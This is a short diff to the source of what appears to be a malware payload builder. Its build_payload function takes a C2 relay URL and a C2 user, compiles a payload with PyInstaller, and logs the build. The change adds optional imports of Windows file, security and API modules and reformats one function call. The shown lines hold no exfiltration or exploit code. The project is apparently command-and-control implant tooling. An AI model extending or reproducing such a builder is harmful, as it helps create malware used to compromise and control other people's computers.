@@ -8,6 +8,11 @@ import base64
 import json
 import psutil
 from pyinstaller_versionfile import create_versionfile
+try:
+    import win32file, win32con, win32api, win32security, pywintypes
+    PYWIN32_AVAILABLE = True
+except ImportError:
+    PYWIN32_AVAILABLE = False
 
 def simple_log_filter(line, state):
     line_strip = line.strip(); line_lower = line_strip.lower()
@@ -26,7 +31,10 @@ def build_payload(settings, relay_url, c2_user, log_callback, thread_object):
     main_payload_full_name = settings.get("payload_name") + settings.get("payload_ext")
     log_callback(f"\n[Builder] Starting build for payload: {main_payload_full_name}...")
     
-    final_path = _compile_single(main_payload_full_name, settings, relay_url, c2_user, log_callback, thread_object)
+    final_path = _compile_single(
+        main_payload_full_name, settings, relay_url, c2_user, 
+        log_callback, thread_object
+    )
 
     if not final_path:
         log_callback(f"[ERROR] Failed to build main payload. Aborting.")
